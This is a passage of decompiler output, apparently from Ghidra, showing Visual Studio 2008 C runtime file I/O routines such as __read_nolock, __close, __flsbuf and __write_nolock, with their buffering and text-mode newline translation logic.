      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_00433150;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x40 + (&DAT_00437d80)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  ulong *puVar5;
  int *piVar6;
  uint uVar7;
  short *psVar8;
  BOOL BVar9;
  DWORD DVar10;
  ulong uVar11;
  short *psVar12;
  int iVar13;
  int iVar14;
  int unaff_EDI;
  bool bVar15;
  longlong lVar16;
  short sVar17;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_00437d68 <= (uint)_FileHandle)) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  piVar6 = &DAT_00437d80 + (_FileHandle >> 5);
  iVar14 = (_FileHandle & 0x1fU) * 0x40;
  bVar3 = *(byte *)(*piVar6 + iVar14 + 4);
  if ((bVar3 & 1) == 0) {
    puVar5 = ___doserrno();
    *puVar5 = 0;
    piVar6 = __errno();
    *piVar6 = 9;
    goto LAB_0041a440;
  }
  if (_MaxCharCount < 0x80000000) {
    local_14 = (short *)0x0;
    if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
      return 0;
    }
    if (_DstBuf != (void *)0x0) {
      local_6 = (char)(*(char *)(*piVar6 + iVar14 + 0x24) * '\x02') >> 1;
      if (local_6 == '\x01') {
        if ((~_MaxCharCount & 1) == 0) goto LAB_0041a42e;
        uVar7 = _MaxCharCount >> 1;
        _MaxCharCount = 4;
        if (3 < uVar7) {
          _MaxCharCount = uVar7;
        }
        local_10 = (short *)__malloc_crt(_MaxCharCount);
        if (local_10 == (short *)0x0) {
          piVar6 = __errno();
          *piVar6 = 0xc;
          puVar5 = ___doserrno();
          *puVar5 = 8;
          return -1;
        }
        lVar16 = __lseeki64_nolock(_FileHandle,0x100000000,unaff_EDI);
        iVar13 = *piVar6;
        *(int *)(iVar14 + 0x28 + iVar13) = (int)lVar16;
        *(int *)(iVar14 + 0x2c + iVar13) = (int)((ulonglong)lVar16 >> 0x20);
      }
      else {
        if (local_6 == '\x02') {
          if ((~_MaxCharCount & 1) == 0) goto LAB_0041a42e;
          _MaxCharCount = _MaxCharCount & 0xfffffffe;
        }
        local_10 = (short *)_DstBuf;
      }
      psVar8 = local_10;
      uVar7 = _MaxCharCount;
      if ((((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) != 0) &&
          (cVar4 = *(char *)(*piVar6 + iVar14 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
        *(char *)local_10 = cVar4;
        psVar8 = (short *)((int)local_10 + 1);
        uVar7 = _MaxCharCount - 1;
        local_14 = (short *)0x1;
        *(undefined *)(iVar14 + 5 + *piVar6) = 10;
        if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar6), cVar4 != '\n')) &&
           (uVar7 != 0)) {
          *(char *)psVar8 = cVar4;
          psVar8 = local_10 + 1;
          uVar7 = _MaxCharCount - 2;
          local_14 = (short *)0x2;
          *(undefined *)(iVar14 + 0x25 + *piVar6) = 10;
          if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar6), cVar4 != '\n'))
             && (uVar7 != 0)) {
            *(char *)psVar8 = cVar4;
            psVar8 = (short *)((int)local_10 + 3);
            local_14 = (short *)0x3;
            *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
            uVar7 = _MaxCharCount - 3;
          }
        }
      }
      _MaxCharCount = uVar7;
      BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),psVar8,_MaxCharCount,&local_1c,
                       (LPOVERLAPPED)0x0);
      if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
        uVar11 = GetLastError();
        if (uVar11 != 5) {
          if (uVar11 == 0x6d) {
            local_18 = 0;
            goto LAB_0041a74d;
          }
          goto LAB_0041a742;
        }
        piVar6 = __errno();
        *piVar6 = 9;
        puVar5 = ___doserrno();
        *puVar5 = 5;
      }
      else {
        local_14 = (short *)((int)local_14 + local_1c);
        pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
        if ((*pbVar1 & 0x80) == 0) goto LAB_0041a74d;
        if (local_6 == '\x02') {
          if ((local_1c == 0) || (*local_10 != 10)) {
            *pbVar1 = *pbVar1 & 0xfb;
          }
          else {
            *pbVar1 = *pbVar1 | 4;
          }
          local_14 = (short *)((int)local_14 + (int)local_10);
          _MaxCharCount = (uint)local_10;
          psVar8 = local_10;
          if (local_10 < local_14) {
            do {
              sVar17 = *(short *)_MaxCharCount;
              if (sVar17 == 0x1a) {
                pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
                if ((*pbVar1 & 0x40) == 0) {
                  *pbVar1 = *pbVar1 | 2;
                }
                else {
                  *psVar8 = *(short *)_MaxCharCount;
                  psVar8 = psVar8 + 1;
                }
                break;
              }
              if (sVar17 == 0xd) {
                if (_MaxCharCount < local_14 + -1) {
                  if (*(short *)(_MaxCharCount + 2) == 10) {
                    uVar2 = _MaxCharCount + 4;
                    goto LAB_0041a7f0;
                  }
LAB_0041a883:
                  _MaxCharCount = _MaxCharCount + 2;
                  sVar17 = 0xd;
LAB_0041a885:
                  *psVar8 = sVar17;
                }
                else {
                  uVar2 = _MaxCharCount + 2;
                  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_c,2,&local_1c,
                                   (LPOVERLAPPED)0x0);
                  if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                  goto LAB_0041a883;
                  if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                    if ((psVar8 == local_10) && (local_c == 10)) goto LAB_0041a7f0;
                    __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                    if (local_c == 10) goto LAB_0041a88b;
                    goto LAB_0041a883;
                  }
                  if (local_c == 10) {
LAB_0041a7f0:
                    _MaxCharCount = uVar2;
                    sVar17 = 10;
                    goto LAB_0041a885;
                  }
                  *psVar8 = 0xd;
                  *(undefined *)(iVar14 + 5 + *piVar6) = (undefined)local_c;
                  *(undefined *)(iVar14 + 0x25 + *piVar6) = local_c._1_1_;
                  *(undefined *)(iVar14 + 0x26 + *piVar6) = 10;
                  _MaxCharCount = uVar2;
                }
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount;
              }
              else {
                *psVar8 = sVar17;
                psVar8 = psVar8 + 1;
                uVar2 = _MaxCharCount + 2;
              }
LAB_0041a88b:
              _MaxCharCount = uVar2;
            } while (_MaxCharCount < local_14);
          }
          local_14 = (short *)((int)psVar8 - (int)local_10);
          goto LAB_0041a74d;
        }
        if ((local_1c == 0) || (*(char *)local_10 != '\n')) {
          *pbVar1 = *pbVar1 & 0xfb;
        }
        else {
          *pbVar1 = *pbVar1 | 4;
        }
        local_14 = (short *)((int)local_14 + (int)local_10);
        _MaxCharCount = (uint)local_10;
        psVar8 = local_10;
        if (local_10 < local_14) {
          do {
            cVar4 = *(char *)_MaxCharCount;
            if (cVar4 == '\x1a') {
              pbVar1 = (byte *)(iVar14 + 4 + *piVar6);
              if ((*pbVar1 & 0x40) == 0) {
                *pbVar1 = *pbVar1 | 2;
              }
              else {
                *(undefined *)psVar8 = *(undefined *)_MaxCharCount;
                psVar8 = (short *)((int)psVar8 + 1);
              }
              break;
            }
            if (cVar4 == '\r') {
              if (_MaxCharCount < (undefined *)((int)local_14 + -1)) {
                if (*(char *)(_MaxCharCount + 1) == '\n') {
                  uVar7 = _MaxCharCount + 2;
                  goto LAB_0041a5cd;
                }
LAB_0041a644:
                _MaxCharCount = _MaxCharCount + 1;
                *(undefined *)psVar8 = 0xd;
              }
              else {
                uVar7 = _MaxCharCount + 1;
                BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar6),&local_5,1,&local_1c,
                                 (LPOVERLAPPED)0x0);
                if (((BVar9 == 0) && (DVar10 = GetLastError(), DVar10 != 0)) || (local_1c == 0))
                goto LAB_0041a644;
                if ((*(byte *)(iVar14 + 4 + *piVar6) & 0x48) == 0) {
                  if ((psVar8 == local_10) && (local_5 == '\n')) goto LAB_0041a5cd;
                  __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EDI);
                  if (local_5 == '\n') goto LAB_0041a648;
                  goto LAB_0041a644;
                }
                if (local_5 == '\n') {
LAB_0041a5cd:
                  _MaxCharCount = uVar7;
                  *(undefined *)psVar8 = 10;
                }
                else {
                  *(undefined *)psVar8 = 0xd;
                  *(char *)(iVar14 + 5 + *piVar6) = local_5;
                  _MaxCharCount = uVar7;
                }
              }
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount;
            }
            else {
              *(char *)psVar8 = cVar4;
              psVar8 = (short *)((int)psVar8 + 1);
              uVar7 = _MaxCharCount + 1;
            }
LAB_0041a648:
            _MaxCharCount = uVar7;
          } while (_MaxCharCount < local_14);
        }
        local_14 = (short *)((int)psVar8 - (int)local_10);
        if ((local_6 != '\x01') || (local_14 == (short *)0x0)) goto LAB_0041a74d;
        bVar3 = *(byte *)(short *)((int)psVar8 + -1);
        if ((char)bVar3 < '\0') {
          iVar13 = 1;
          psVar8 = (short *)((int)psVar8 + -1);
          while ((((&DAT_00433048)[bVar3] == '\0' && (iVar13 < 5)) && (local_10 <= psVar8))) {
            psVar8 = (short *)((int)psVar8 + -1);
            bVar3 = *(byte *)psVar8;
            iVar13 = iVar13 + 1;
          }
          if ((char)(&DAT_00433048)[*(byte *)psVar8] == 0) {
            piVar6 = __errno();
            *piVar6 = 0x2a;
            goto LAB_0041a749;
          }
          if ((char)(&DAT_00433048)[*(byte *)psVar8] + 1 == iVar13) {
            psVar8 = (short *)((int)psVar8 + iVar13);
          }
          else if ((*(byte *)(*piVar6 + iVar14 + 4) & 0x48) == 0) {
            __lseeki64_nolock(_FileHandle,CONCAT44(1,-iVar13 >> 0x1f),unaff_EDI);
          }
          else {
            psVar12 = (short *)((int)psVar8 + 1);
            *(byte *)(*piVar6 + iVar14 + 5) = *(byte *)psVar8;
            if (1 < iVar13) {
              *(undefined *)(iVar14 + 0x25 + *piVar6) = *(undefined *)psVar12;
              psVar12 = psVar8 + 1;
            }
            if (iVar13 == 3) {
              *(undefined *)(iVar14 + 0x26 + *piVar6) = *(undefined *)psVar12;
              psVar12 = (short *)((int)psVar12 + 1);
            }
            psVar8 = (short *)((int)psVar12 - iVar13);
          }
        }
        iVar13 = (int)psVar8 - (int)local_10;
        local_14 = (short *)MultiByteToWideChar(0xfde9,0,(LPCSTR)local_10,iVar13,(LPWSTR)_DstBuf,
                                                uVar2 >> 1);
        if (local_14 != (short *)0x0) {
          bVar15 = local_14 != (short *)iVar13;
          local_14 = (short *)((int)local_14 * 2);
          *(uint *)(iVar14 + 0x30 + *piVar6) = (uint)bVar15;
          goto LAB_0041a74d;
        }
        uVar11 = GetLastError();
LAB_0041a742:
        __dosmaperr(uVar11);
      }
LAB_0041a749:
      local_18 = -1;
LAB_0041a74d:
      if (local_10 != (short *)_DstBuf) {
        _free(local_10);
      }
      if (local_18 == -2) {
        return (int)local_14;
      }
      return local_18;
    }
  }
LAB_0041a42e:
  puVar5 = ___doserrno();
  *puVar5 = 0;
  piVar6 = __errno();
  *piVar6 = 0x16;
LAB_0041a440:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __read
// 
// Library: Visual Studio 2008 Release

int __cdecl __read(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    return -1;
  }
  if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00437d68)) {
    iVar3 = (_FileHandle & 0x1fU) * 0x40;
    if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
      if (_MaxCharCount < 0x80000000) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          puVar1 = ___doserrno();
          *puVar1 = 0;
          local_20 = -1;
        }
        else {
          local_20 = __read_nolock(_FileHandle,_DstBuf,_MaxCharCount);
        }
        FUN_0041a9eb();
        return local_20;
      }
      puVar1 = ___doserrno();
      *puVar1 = 0;
      piVar2 = __errno();
      *piVar2 = 0x16;
      goto LAB_0041a947;
    }
  }
  puVar1 = ___doserrno();
  *puVar1 = 0;
  piVar2 = __errno();
  *piVar2 = 9;
LAB_0041a947:
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return -1;
}



void FUN_0041a9eb(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __fileno
// 
// Library: Visual Studio 2008 Release

int __cdecl __fileno(FILE *_File)

{
  int *piVar1;
  int iVar2;
  
  if (_File == (FILE *)0x0) {
    piVar1 = __errno();
    *piVar1 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    iVar2 = -1;
  }
  else {
    iVar2 = _File->_file;
  }
  return iVar2;
}



// Library Function - Single Match
//  __close_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __close_nolock(int _FileHandle)

{
  intptr_t iVar1;
  intptr_t iVar2;
  HANDLE hObject;
  BOOL BVar3;
  DWORD DVar4;
  int iVar5;
  
  iVar1 = __get_osfhandle(_FileHandle);
  if (iVar1 != -1) {
    if (((_FileHandle == 1) && ((*(byte *)(DAT_00437d80 + 0x84) & 1) != 0)) ||
       ((_FileHandle == 2 && ((*(byte *)(DAT_00437d80 + 0x44) & 1) != 0)))) {
      iVar1 = __get_osfhandle(2);
      iVar2 = __get_osfhandle(1);
      if (iVar2 == iVar1) goto LAB_0041aa8d;
    }
    hObject = (HANDLE)__get_osfhandle(_FileHandle);
    BVar3 = CloseHandle(hObject);
    if (BVar3 == 0) {
      DVar4 = GetLastError();
      goto LAB_0041aa8f;
    }
  }
LAB_0041aa8d:
  DVar4 = 0;
LAB_0041aa8f:
  __free_osfhnd(_FileHandle);
  *(undefined *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + (_FileHandle & 0x1fU) * 0x40) = 0;
  if (DVar4 == 0) {
    iVar5 = 0;
  }
  else {
    __dosmaperr(DVar4);
    iVar5 = -1;
  }
  return iVar5;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  __close
// 
// Library: Visual Studio 2008 Release

int __cdecl __close(int _FileHandle)

{
  ulong *puVar1;
  int *piVar2;
  int iVar3;
  int local_20;
  
  if (_FileHandle == -2) {
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
  }
  else {
    if ((-1 < _FileHandle) && ((uint)_FileHandle < DAT_00437d68)) {
      iVar3 = (_FileHandle & 0x1fU) * 0x40;
      if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) != 0) {
        ___lock_fhandle(_FileHandle);
        if ((*(byte *)((&DAT_00437d80)[_FileHandle >> 5] + 4 + iVar3) & 1) == 0) {
          piVar2 = __errno();
          *piVar2 = 9;
          local_20 = -1;
        }
        else {
          local_20 = __close_nolock(_FileHandle);
        }
        FUN_0041ab86();
        return local_20;
      }
    }
    puVar1 = ___doserrno();
    *puVar1 = 0;
    piVar2 = __errno();
    *piVar2 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  return -1;
}



void FUN_0041ab86(void)

{
  int unaff_EBP;
  
  __unlock_fhandle(*(int *)(unaff_EBP + 8));
  return;
}



// Library Function - Single Match
//  __freebuf
// 
// Library: Visual Studio 2008 Release

void __cdecl __freebuf(FILE *_File)

{
  if (((_File->_flag & 0x83U) != 0) && ((_File->_flag & 8U) != 0)) {
    _free(_File->_base);
    _File->_flag = _File->_flag & 0xfffffbf7;
    _File->_ptr = (char *)0x0;
    _File->_base = (char *)0x0;
    _File->_cnt = 0;
  }
  return;
}



// Library Function - Single Match
//  __flush
// 
// Library: Visual Studio 2008 Release

int __cdecl __flush(FILE *_File)

{
  int _FileHandle;
  uint uVar1;
  int iVar2;
  uint uVar3;
  char *_Buf;
  
  iVar2 = 0;
  if ((((byte)_File->_flag & 3) == 2) && ((_File->_flag & 0x108U) != 0)) {
    _Buf = _File->_base;
    uVar3 = (int)_File->_ptr - (int)_Buf;
    if (0 < (int)uVar3) {
      uVar1 = uVar3;
      _FileHandle = __fileno(_File);
      uVar1 = __write(_FileHandle,_Buf,uVar1);
      if (uVar1 == uVar3) {
        if ((char)_File->_flag < '\0') {
          _File->_flag = _File->_flag & 0xfffffffd;
        }
      }
      else {
        _File->_flag = _File->_flag | 0x20;
        iVar2 = -1;
      }
    }
  }
  _File->_cnt = 0;
  _File->_ptr = _File->_base;
  return iVar2;
}



// Library Function - Single Match
//  __fflush_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __fflush_nolock(FILE *_File)

{
  int iVar1;
  
  if (_File == (FILE *)0x0) {
    iVar1 = _flsall(0);
  }
  else {
    iVar1 = __flush(_File);
    if (iVar1 == 0) {
      if ((_File->_flag & 0x4000U) == 0) {
        iVar1 = 0;
      }
      else {
        iVar1 = __fileno(_File);
        iVar1 = __commit(iVar1);
        iVar1 = -(uint)(iVar1 != 0);
      }
    }
    else {
      iVar1 = -1;
    }
  }
  return iVar1;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// Library Function - Single Match
//  _flsall
// 
// Libraries: Visual Studio 2008 Release, Visual Studio 2010 Release

int __cdecl _flsall(int param_1)

{
  void **ppvVar1;
  void *_File;
  FILE *_File_00;
  int iVar2;
  int _Index;
  int local_28;
  int local_20;
  
  local_20 = 0;
  local_28 = 0;
  __lock(1);
  for (_Index = 0; _Index < DAT_00438ea0; _Index = _Index + 1) {
    ppvVar1 = (void **)(DAT_00437e80 + _Index * 4);
    if ((*ppvVar1 != (void *)0x0) && (_File = *ppvVar1, (*(byte *)((int)_File + 0xc) & 0x83) != 0))
    {
      __lock_file2(_Index,_File);
      _File_00 = *(FILE **)(DAT_00437e80 + _Index * 4);
      if ((_File_00->_flag & 0x83U) != 0) {
        if (param_1 == 1) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 != -1) {
            local_20 = local_20 + 1;
          }
        }
        else if ((param_1 == 0) && ((_File_00->_flag & 2U) != 0)) {
          iVar2 = __fflush_nolock(_File_00);
          if (iVar2 == -1) {
            local_28 = -1;
          }
        }
      }
      FUN_0041ad13();
    }
  }
  FUN_0041ad42();
  if (param_1 != 1) {
    local_20 = local_28;
  }
  return local_20;
}



void FUN_0041ad13(void)

{
  int unaff_ESI;
  
  __unlock_file2(unaff_ESI,*(void **)(DAT_00437e80 + unaff_ESI * 4));
  return;
}



void FUN_0041ad42(void)

{
  FUN_0041be7c(1);
  return;
}



// Library Function - Single Match
//  __flsbuf
// 
// Library: Visual Studio 2008 Release

int __cdecl __flsbuf(int _Ch,FILE *_File)

{
  char *_Buf;
  char *pcVar1;
  FILE *_File_00;
  int *piVar2;
  undefined **ppuVar3;
  int iVar4;
  undefined *puVar5;
  int unaff_EDI;
  uint uVar6;
  longlong lVar7;
  uint local_8;
  
  _File_00 = _File;
  _File = (FILE *)__fileno(_File);
  uVar6 = _File_00->_flag;
  if ((uVar6 & 0x82) == 0) {
    piVar2 = __errno();
    *piVar2 = 9;
LAB_0041ad7a:
    _File_00->_flag = _File_00->_flag | 0x20;
    return -1;
  }
  if ((uVar6 & 0x40) != 0) {
    piVar2 = __errno();
    *piVar2 = 0x22;
    goto LAB_0041ad7a;
  }
  if ((uVar6 & 1) != 0) {
    _File_00->_cnt = 0;
    if ((uVar6 & 0x10) == 0) {
      _File_00->_flag = uVar6 | 0x20;
      return -1;
    }
    _File_00->_ptr = _File_00->_base;
    _File_00->_flag = uVar6 & 0xfffffffe;
  }
  uVar6 = _File_00->_flag;
  _File_00->_flag = uVar6 & 0xffffffef | 2;
  _File_00->_cnt = 0;
  local_8 = 0;
  if (((uVar6 & 0x10c) == 0) &&
     (((ppuVar3 = FUN_00419b14(), _File_00 != (FILE *)(ppuVar3 + 8) &&
       (ppuVar3 = FUN_00419b14(), _File_00 != (FILE *)(ppuVar3 + 0x10))) ||
      (iVar4 = __isatty((int)_File), iVar4 == 0)))) {
    __getbuf(_File_00);
  }
  if ((_File_00->_flag & 0x108U) == 0) {
    uVar6 = 1;
    local_8 = __write((int)_File,&_Ch,1);
  }
  else {
    _Buf = _File_00->_base;
    pcVar1 = _File_00->_ptr;
    _File_00->_ptr = _Buf + 1;
    uVar6 = (int)pcVar1 - (int)_Buf;
    _File_00->_cnt = _File_00->_bufsiz + -1;
    if ((int)uVar6 < 1) {
      if ((_File == (FILE *)0xffffffff) || (_File == (FILE *)0xfffffffe)) {
        puVar5 = &DAT_00433150;
      }
      else {
        puVar5 = (undefined *)(((uint)_File & 0x1f) * 0x40 + (&DAT_00437d80)[(int)_File >> 5]);
      }
      if (((puVar5[4] & 0x20) != 0) &&
         (lVar7 = __lseeki64((int)_File,0x200000000,unaff_EDI), lVar7 == -1)) goto LAB_0041aea2;
    }
    else {
      local_8 = __write((int)_File,_Buf,uVar6);
    }
    *_File_00->_base = (char)_Ch;
  }
  if (local_8 == uVar6) {
    return _Ch & 0xff;
  }
LAB_0041aea2:
  _File_00->_flag = _File_00->_flag | 0x20;
  return -1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe
// WARNING: Type propagation algorithm not settling
// Library Function - Single Match
//  __write_nolock
// 
// Library: Visual Studio 2008 Release

int __cdecl __write_nolock(int _FileHandle,void *_Buf,uint _MaxCharCount)

{
  WCHAR WVar1;
  wint_t wVar2;
  ulong *puVar3;
  int *piVar4;
  int iVar5;
  _ptiddata p_Var6;
  BOOL BVar7;
  DWORD nNumberOfBytesToWrite;
  int iVar8;
  uint uVar9;
  char cVar10;
  WCHAR *pWVar11;
  char *pcVar12;
  int unaff_EDI;
  WCHAR *pWVar13;
  ushort uVar14;
  UINT local_1ae8;
  uint local_1ae4;
  char local_1add;
  int *local_1adc;
  char *local_1ad8;
  int local_1ad4;
  WCHAR *local_1ad0;
  char *local_1acc;
  WCHAR *local_1ac8;
  DWORD local_1ac4;
  WCHAR *local_1ac0;
  WCHAR local_1abc [852];
  CHAR local_1414 [3416];
  WCHAR local_6bc [854];
  undefined2 local_10;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)&stack0xfffffffc;
  local_1ad0 = (WCHAR *)_Buf;
  local_1acc = (char *)0x0;
  local_1ad4 = 0;
  if (_MaxCharCount == 0) goto LAB_0041b5de;
  if (_Buf == (void *)0x0) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041b5de;
  }
  piVar4 = &DAT_00437d80 + (_FileHandle >> 5);
  iVar8 = (_FileHandle & 0x1fU) * 0x40;
  cVar10 = (char)(*(char *)(*piVar4 + iVar8 + 0x24) * '\x02') >> 1;
  local_1add = cVar10;
  local_1adc = piVar4;
  if (((cVar10 == '\x02') || (cVar10 == '\x01')) && ((~_MaxCharCount & 1) == 0)) {
    puVar3 = ___doserrno();
    *puVar3 = 0;
    piVar4 = __errno();
    *piVar4 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    goto LAB_0041b5de;
  }
  if ((*(byte *)(*piVar4 + iVar8 + 4) & 0x20) != 0) {
    __lseeki64_nolock(_FileHandle,0x200000000,unaff_EDI);
  }
  iVar5 = __isatty(_FileHandle);
  if ((iVar5 == 0) || ((*(byte *)(iVar8 + 4 + *piVar4) & 0x80) == 0)) {
LAB_0041b24f:
    if ((*(byte *)((HANDLE *)(*piVar4 + iVar8) + 1) & 0x80) == 0) {
      BVar7 = WriteFile(*(HANDLE *)(*piVar4 + iVar8),local_1ad0,_MaxCharCount,(LPDWORD)&local_1ad8,
                        (LPOVERLAPPED)0x0);
      if (BVar7 == 0) {
LAB_0041b54f:
        local_1ac4 = GetLastError();
      }
      else {
        local_1ac4 = 0;
        local_1acc = local_1ad8;
      }
LAB_0041b55b:
      if (local_1acc != (char *)0x0) goto LAB_0041b5de;
      goto LAB_0041b564;
    }
    local_1ac4 = 0;
    if (cVar10 == '\0') {
      local_1ac8 = local_1ad0;
      if (_MaxCharCount == 0) goto LAB_0041b5a0;
      do {
        local_1ac0 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac8 - (int)local_1ad0;
        pWVar11 = local_1abc;
        do {
          if (_MaxCharCount <= uVar9) break;
          pWVar13 = (WCHAR *)((int)local_1ac8 + 1);
          cVar10 = *(char *)local_1ac8;
          uVar9 = uVar9 + 1;
          if (cVar10 == '\n') {
            local_1ad4 = local_1ad4 + 1;
            *(char *)pWVar11 = '\r';
            pWVar11 = (WCHAR *)((int)pWVar11 + 1);
            local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          }
          *(char *)pWVar11 = cVar10;
          pWVar11 = (WCHAR *)((int)pWVar11 + 1);
          local_1ac0 = (WCHAR *)((int)local_1ac0 + 1);
          local_1ac8 = pWVar13;
        } while (local_1ac0 < (WCHAR *)0x13ff);
        BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                          (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
        if (BVar7 == 0) goto LAB_0041b54f;
        local_1acc = local_1acc + (int)local_1ad8;
      } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
              (piVar4 = local_1adc, (uint)((int)local_1ac8 - (int)local_1ad0) < _MaxCharCount));
      goto LAB_0041b55b;
    }
    local_1ac0 = local_1ad0;
    if (cVar10 == '\x02') {
      if (_MaxCharCount != 0) {
        do {
          local_1ac8 = (WCHAR *)0x0;
          uVar9 = (int)local_1ac0 - (int)local_1ad0;
          pWVar11 = local_1abc;
          do {
            if (_MaxCharCount <= uVar9) break;
            pWVar13 = local_1ac0 + 1;
            WVar1 = *local_1ac0;
            uVar9 = uVar9 + 2;
            if (WVar1 == L'\n') {
              local_1ad4 = local_1ad4 + 2;
              *pWVar11 = L'\r';
              pWVar11 = pWVar11 + 1;
              local_1ac8 = local_1ac8 + 1;
            }
            local_1ac8 = local_1ac8 + 1;
            *pWVar11 = WVar1;
            pWVar11 = pWVar11 + 1;
            local_1ac0 = pWVar13;
          } while (local_1ac8 < (WCHAR *)0x13fe);
          BVar7 = WriteFile(*(HANDLE *)(iVar8 + *piVar4),local_1abc,(int)pWVar11 - (int)local_1abc,
                            (LPDWORD)&local_1ad8,(LPOVERLAPPED)0x0);
          if (BVar7 == 0) goto LAB_0041b54f;
          local_1acc = local_1acc + (int)local_1ad8;
        } while (((int)pWVar11 - (int)local_1abc <= (int)local_1ad8) &&
                (piVar4 = local_1adc, (uint)((int)local_1ac0 - (int)local_1ad0) < _MaxCharCount));
        goto LAB_0041b55b;
      }
    }
    else if (_MaxCharCount != 0) {
      do {
        local_1ac8 = (WCHAR *)0x0;
        uVar9 = (int)local_1ac0 - (int)local_1ad0;
